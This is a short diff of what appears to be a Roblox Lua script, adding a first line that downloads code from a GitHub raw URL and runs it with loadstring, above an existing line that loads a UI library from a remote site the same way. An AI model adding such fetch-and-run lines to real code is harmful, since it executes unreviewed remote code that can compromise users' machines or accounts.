@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khanh-lol/amongus/refs/heads/main/idk"))()
 local a=loadstring(game:HttpGet"https://sirius.menu/rayfield")()
 
 
